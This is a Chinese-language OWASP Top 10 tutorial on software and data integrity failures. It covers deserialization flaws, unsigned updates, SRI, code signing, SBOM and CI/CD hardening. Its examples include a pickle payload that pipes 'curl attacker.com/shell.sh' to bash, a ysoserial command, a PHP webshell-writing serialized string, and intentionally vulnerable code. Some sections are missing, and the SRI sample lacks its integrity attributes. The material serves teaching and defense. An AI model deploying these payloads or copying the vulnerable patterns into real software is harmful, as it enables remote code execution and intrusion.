A08:2021 - 软件和数据完整性失效

HIGH 排名第8

Software and Data Integrity Failures（软件和数据完整性失效）关注的是代码和基础设施在未验证完整性的情况下被信任执行的问题。当应用依赖不受信任的来源（插件、库、CDN）而不做完整性验证时，攻击者可以注入恶意代码，影响整个软件供应链。

2021 年新变化

A08 在 2021 版本中是新增类别，合并了原来的 A08:2017 不安全的反序列化 并扩展为更广泛的软件完整性概念。新增了 CI/CD 流水线安全、供应链攻击、代码签名等内容。

近年来 SolarWinds、Codecov、Log4Shell 等事件表明，供应链攻击已成为最严重的安全威胁之一。

1. 概述

1.1 什么是软件完整性失效

软件完整性失效发生在以下场景：

  • 应用程序依赖来自不受信任来源的插件、库或模块
  • CI/CD 流水线缺少完整性验证，允许未授权代码进入生产环境
  • 自动更新功能在未验证签名的情况下下载并安装更新
  • 对象或数据被序列化后通过不受信任的通道传输而未验证

1.2 CI/CD 流水线信任问题

2. 不安全的反序列化

2.1 反序列化基本原理

序列化是将对象转换为字节流（用于存储或传输），反序列化是其逆过程。当应用程序反序列化来自不受信任来源的数据时，攻击者可以操控序列化数据来执行任意代码、发起拒绝服务攻击或绕过认证。

反序列化攻击原理： ┌──────────┐ 序列化 ┌──────────────┐ 网络传输 ┌──────────┐ │ Object │──────────────▶│ Byte Stream │──────────────▶│ 攻击者 │ │ (服务端) │ │ (可被篡改) │ │ 篡改数据 │ └──────────┘ └──────────────┘ └────┬─────┘ │ ┌──────────┐ 反序列化 ┌──────────────┐ │ │ RCE!!! │◀─────────────│ 恶意 Payload │◀─────────────┘ │ 服务器 │ │ (Gadget Chain)│ └──────────┘ └──────────────┘ 关键点：反序列化过程中自动调用的方法（如 Java 的 readObject()、 Python 的 __reduce__()、PHP 的 __wakeup()）可被利用执行任意代码。

2.2 Java 反序列化 (ObjectInputStream)

Java 反序列化漏洞是最严重的一类，因为 Java 拥有丰富的 "Gadget Chain"（小工具链），允许攻击者通过精心构造的序列化对象实现远程代码执行（RCE）。

危险：Java ObjectInputStream

永远不要对不受信任的数据使用 ObjectInputStream.readObject()。常见的可利用库包括：Apache Commons Collections、Spring Framework、Groovy、Apache Commons BeanUtils 等。

// ❌ 危险示例：直接反序列化用户输入
import java.io.*;

public class VulnerableEndpoint {
    public Object deserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        // 危险！攻击者控制的数据被直接反序列化
        return ois.readObject();
    }
}

// 攻击者利用 Apache Commons Collections Gadget Chain：
// 使用 ysoserial 工具生成 payload
// $ java -jar ysoserial.jar CommonsCollections1 'calc.exe' | base64

// ✅ 安全替代方案：使用白名单过滤
import org.apache.commons.io.serialization.ValidatingObjectInputStream;

public class SafeEndpoint {
    public Object deserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ValidatingObjectInputStream ois = new ValidatingObjectInputStream(bais);
        // 只允许特定的安全类被反序列化
        ois.accept(AllowedClass1.class, AllowedClass2.class);
        ois.accept("java.lang.*", "java.util.*");
        return ois.readObject();
    }
}

2.3 Python 反序列化 (pickle)

Python 的 pickle 模块在反序列化时会执行 __reduce__() 方法返回的可调用对象，这使得攻击者可以执行任意系统命令。

# ❌ 危险示例：使用 pickle 反序列化用户数据
import pickle
import base64

# 服务端代码 - 从 Cookie/请求中读取序列化数据
def load_session(cookie_data):
    data = base64.b64decode(cookie_data)
    return pickle.loads(data)  # 危险！

# 攻击者构造恶意 payload
import os

class MaliciousPayload:
    def __reduce__(self):
        # 反序列化时自动执行
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# 生成恶意 Cookie
payload = pickle.dumps(MaliciousPayload())
evil_cookie = base64.b64encode(payload).decode()
print(f"恶意Cookie: {evil_cookie}")

# ✅ 安全替代方案
import json
import hmac
import hashlib

SECRET_KEY = b'your-secret-key-here'

def safe_save_session(session_data):
    """使用 JSON + HMAC 签名"""
    data = json.dumps(session_data).encode()
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
    return base64.b64encode(data).decode() + '.' + signature

def safe_load_session(signed_data):
    """验证签名后再解析"""
    parts = signed_data.split('.')
    if len(parts) != 2:
        raise ValueError("Invalid session format")
    data_b64, signature = parts
    data = base64.b64decode(data_b64)
    expected_sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected_sig):
        raise ValueError("Session signature verification failed")
    return json.loads(data)

2.4 PHP 反序列化 (unserialize)

PHP 的 unserialize() 函数在对象重建时会自动调用魔术方法（__wakeup()、__destruct()），攻击者可通过 POP Chain（Property Oriented Programming）实现代码执行。

// ❌ 危险示例：PHP 反序列化
<?php
// 从用户请求中读取序列化数据
$data = $_COOKIE['session_data'];
$obj = unserialize($data);  // 危险！

// 可利用的类（Gadget）
class FileHandler {
    public $filename;
    public $content;

    public function __destruct() {
        // 对象销毁时自动调用
        file_put_contents($this->filename, $this->content);
    }
}

// 攻击者构造 payload 写入 webshell：
// O:11:"FileHandler":2:{s:8:"filename";s:18:"/var/www/shell.php";
//   s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// ✅ 安全替代方案
// 1. 使用 JSON 代替 serialize
$session = json_decode($cookie_data, true);

// 2. 如果必须使用 unserialize，限制允许的类
$obj = unserialize($data, ['allowed_classes' => ['SafeClass1', 'SafeClass2']]);

// 3. 使用 HMAC 验证数据完整性
$payload = base64_decode($data);
$signature = hash_hmac('sha256', $payload, $secret_key);
if (!hash_equals($expected_signature, $signature)) {
    die('数据被篡改');
}
?>

2.5 .NET 反序列化

// ❌ 危险示例：.NET BinaryFormatter
using System.Runtime.Serialization.Formatters.Binary;

public object DeserializeData(byte[] data) {
    var formatter = new BinaryFormatter();  // 已标记为过时且危险
    using (var stream = new MemoryStream(data)) {
        return formatter.Deserialize(stream);  // RCE 风险
    }
}

// ✅ 安全替代方案：使用 System.Text.Json
using System.Text.Json;

public T SafeDeserialize<T>(string json) {
    var options = new JsonSerializerOptions {
        PropertyNameCaseInsensitive = true,
        // 不允许注释和尾随逗号以减少攻击面
        ReadCommentHandling = JsonCommentHandling.Disallow,
        AllowTrailingCommas = false
    };
    return JsonSerializer.Deserialize<T>(json, options);
}

4. CI/CD 流水线攻击

4.1 构建服务器沦陷

CI/CD 服务器（Jenkins、GitLab CI、GitHub Actions）通常拥有生产环境的部署权限和各种 Secrets。一旦构建服务器被入侵，攻击者可以：

  • 在构建过程中注入后门代码
  • 窃取部署凭证和 API Keys
  • 修改构建产物（编译后的二进制文件）
  • 植入持久化访问机制

5. 未签名的软件更新

5.1 不安全的自动更新流程

典型漏洞场景

许多应用通过 HTTP（非 HTTPS）检查更新，或虽使用 HTTPS 但不验证下载文件的数字签名。中间人攻击者可替换更新包为恶意程序，在用户毫不知情的情况下获得代码执行权限。

# ❌ 不安全的更新检查（伪代码）
def check_update():
    # 问题1: 使用 HTTP，可被中间人劫持
    response = requests.get("http://updates.example.com/latest.json")
    update_info = response.json()

    if update_info['version'] > CURRENT_VERSION:
        # 问题2: 下载后不验证签名
        binary = requests.get(update_info['download_url']).content
        # 问题3: 直接执行下载的文件
        with open('/tmp/update.bin', 'wb') as f:
            f.write(binary)
        os.chmod('/tmp/update.bin', 0o755)
        os.execv('/tmp/update.bin', [])

# ✅ 安全的更新流程
import hashlib
from cryptography.hazmat.primitives.asymmetric import padding, utils
from cryptography.hazmat.primitives import hashes
from cryptography.x509 import load_pem_x509_certificate

def secure_update():
    # 1. 使用 HTTPS + 证书固定
    response = requests.get(
        "https://updates.example.com/latest.json",
        verify='/path/to/pinned-ca.pem'
    )
    update_info = response.json()

    if update_info['version'] > CURRENT_VERSION:
        # 2. 下载更新和签名
        binary = requests.get(update_info['download_url'], verify=True).content
        signature = bytes.fromhex(update_info['signature'])

        # 3. 验证哈希
        expected_hash = update_info['sha256']
        actual_hash = hashlib.sha256(binary).hexdigest()
        if actual_hash != expected_hash:
            raise SecurityError("Hash mismatch - file tampered")

        # 4. 验证数字签名（使用内置的公钥）
        with open('update_public_key.pem', 'rb') as f:
            cert = load_pem_x509_certificate(f.read())
        public_key = cert.public_key()
        public_key.verify(
            signature,
            binary,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )

        # 5. 验证通过，安全安装
        install_update(binary)

6. 子资源完整性 (SRI)

6.1 SRI 工作原理

Subresource Integrity（SRI）允许浏览器验证从 CDN 加载的资源是否被篡改。通过在 <script> 或 <link> 标签中添加 integrity 属性，浏览器会比较下载内容的哈希值与预期值。

SRI 验证流程： 浏览器 CDN │ │ │ 1. 请求 jquery.min.js │ │──────────────────────────────────▶│ │ │ │ 2. 返回文件内容 │ │◀──────────────────────────────────│ │ │ │ 3. 计算 SHA-384 哈希 │ │ ┌─────────────────────────┐ │ │ │ SHA384(文件内容) │ │ │ │ = "oqVuAfXRKap7fdgcCY5..."│ │ │ └─────────────────────────┘ │ │ │ │ 4. 与 integrity 属性比较 │ │ ┌─────────────────────────┐ │ │ │ 匹配 ──▶ 执行脚本 │ │ │ │ 不匹配 ──▶ 拒绝加载 │ │ │ └─────────────────────────┘ │ │ │

6.2 SRI 使用示例

<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
<link rel="stylesheet" href="https://cdn.example.com/bootstrap.min.css">

</script>

6.3 Content Security Policy 配合 SRI

# 通过 CSP 强制要求所有脚本使用 SRI
Content-Security-Policy: require-sri-for script style;

# 或者在 HTML meta 标签中设置
<meta http-equiv="Content-Security-Policy"
      content="require-sri-for script style">
SRI 限制与注意事项

动态资源：SRI 不适用于经常变化的资源（如 API 响应），因为每次内容变化都需要更新哈希值。

crossorigin 属性：使用 SRI 时必须添加 crossorigin="anonymous"，否则浏览器无法进行 CORS 校验。

CDN 版本：始终引用带版本号的资源 URL（如 jquery@3.6.0），避免使用 "latest" 等浮动引用。

8.1 代码签名

# GPG 签名 Git 提交
$ git config --global commit.gpgsign true
$ git config --global user.signingkey YOUR_KEY_ID

# 验证签名
$ git log --show-signature

# 签名软件发布包
$ gpg --armor --detach-sign release-v1.0.tar.gz
# 生成 release-v1.0.tar.gz.asc

# 用户验证签名
$ gpg --verify release-v1.0.tar.gz.asc release-v1.0.tar.gz

# Docker 镜像签名 (cosign)
$ cosign sign --key cosign.key myregistry.io/myapp:v1.0
$ cosign verify --key cosign.pub myregistry.io/myapp:v1.0

8.3 SBOM（软件物料清单）

什么是 SBOM

Software Bill of Materials (SBOM) 是软件组件的正式记录，列出所有使用的库、框架及其版本。类似于食品的成分表，SBOM 让用户了解软件中包含哪些组件，便于在漏洞披露时快速评估影响。

2021年美国行政命令要求向联邦政府销售软件的供应商必须提供 SBOM。

# 生成 SBOM (CycloneDX 格式)
$ npm install -g @cyclonedx/cyclonedx-npm
$ cyclonedx-npm --output sbom.json

# 使用 syft 生成容器镜像的 SBOM
$ syft myapp:latest -o cyclonedx-json > sbom.json

# 使用 grype 扫描 SBOM 中的已知漏洞
$ grype sbom:sbom.json

# SBOM 标准格式：
# - CycloneDX (OWASP 项目)
# - SPDX (Linux Foundation)
# - SWID Tags (ISO/IEC 19770-2)

8.4 CI/CD 流水线加固

# Jenkinsfile 安全最佳实践
pipeline {
    agent {
        docker {
            image 'build-env:pinned-sha256@sha256:abc123...'
            // 使用不可变的镜像摘要
        }
    }
    options {
        timeout(time: 30, unit: 'MINUTES')  // 防止恶意构建挂起
    }
    stages {
        stage('Verify') {
            steps {
                // 验证源码完整性
                sh 'git verify-commit HEAD'
                // 验证依赖哈希
                sh 'npm ci --ignore-scripts'
                sh 'npm audit --audit-level=high'
            }
        }
        stage('Build') {
            steps {
                // 隔离构建环境
                sh 'docker build --no-cache --network=none .'
            }
        }
        stage('Sign') {
            steps {
                // 签名构建产物
                sh 'cosign sign --key ${SIGNING_KEY} ${IMAGE_NAME}:${BUILD_TAG}'
            }
        }
    }
}

SLSA 框架 (Supply-chain Levels for Software Artifacts)

Google 提出的 SLSA 框架定义了四个供应链安全等级：

Level 1：构建过程有文档记录（有 SBOM）

Level 2：使用托管构建服务，生成可验证的来源证明

Level 3：构建平台经过审计，源码和构建过程可验证

Level 4：双人审核，密封构建（hermetic build），完全可复现
